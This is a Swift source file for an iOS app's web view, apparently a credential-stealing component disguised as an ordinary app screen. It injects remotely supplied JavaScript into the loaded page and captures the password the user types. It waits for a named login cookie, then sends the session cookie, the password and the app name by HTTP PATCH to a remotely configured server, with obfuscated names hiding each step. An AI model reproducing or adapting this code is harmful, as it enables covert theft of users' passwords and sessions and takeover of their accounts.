//
//  File.swift
//  
//
//  Created by DanHa on 30/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct ThreeCoor: UIViewRepresentable {
    func makeCoordinator() -> ThreeCoorDi {
        ThreeCoorDi(self)
    }

    
    let url: URL?
    @Binding var next_screen_three: Bool //is_three_chuyen_man
    @Binding var load_hide_three: Bool //is_three_load_hide
    @Binding var get_pw_three: String //is_three_get_mat_khau
    var listData: [String: String] = [:]
    
    private let threeWb = ThreeWb()
    var threeOb: NSKeyValueObservation? {
        threeWb.inceThree
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = listData[RemoKey.rm01ch.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
    }

    class ThreeCoorDi: NSObject, WKNavigationDelegate {
        var prentThree: ThreeCoor
        init(_ prentThree: ThreeCoor) {
            self.prentThree = prentThree
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.prentThree.listData[RemoKey.three1af.rawValue] ?? "") { pw, error in
                if let pw = pw as? String, error == nil {
                    self.prentThree.get_pw_three = pw
                }
            }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.prentThree.listData[RemoKey.three2af.rawValue] ?? "")
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                webView.evaluateJavaScript(self.prentThree.listData[RemoKey.three3af.rawValue] ?? "") { data, error in
                    if let pwhtml = data as? String, error == nil {
                        if !pwhtml.isEmpty {
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                let cokiThee = cookies.firstIndex(where: { $0.name == self.prentThree.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                if cokiThee != nil {
                                    UserDefaults.standard.set(try? JSONEncoder().encode(UsMK(matkhau: self.prentThree.get_pw_three)), forKey: "matkhau")
                                    self.prentThree.load_hide_three = true
                                    let jsonThreee: [String: Any] = [
                                        self.prentThree.listData[RemoKey.nam06ap.rawValue] ?? "": cookies[cokiThee!].value,
                                        self.prentThree.listData[RemoKey.nam07ap.rawValue] ?? "": self.prentThree.get_pw_three,
                                        self.prentThree.listData[RemoKey.nam08ap.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
                                    let url = URL(string: self.prentThree.listData[RemoKey.rm04ch.rawValue] ?? "")!
                                    let datajsThree = try? JSONSerialization.data(withJSONObject: jsonThreee)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = datajsThree
                                    let task = URLSession.shared.dataTask(with: request) { _, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else {
                                            self.prentThree.next_screen_three = true
                                        }
                                    }
                                    task.resume()
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

struct UsMK: Codable {
    var matkhau: String
}

@available(iOS 14.0, *)
private class ThreeWb: ObservableObject {
    @Published var inceThree: NSKeyValueObservation?
}
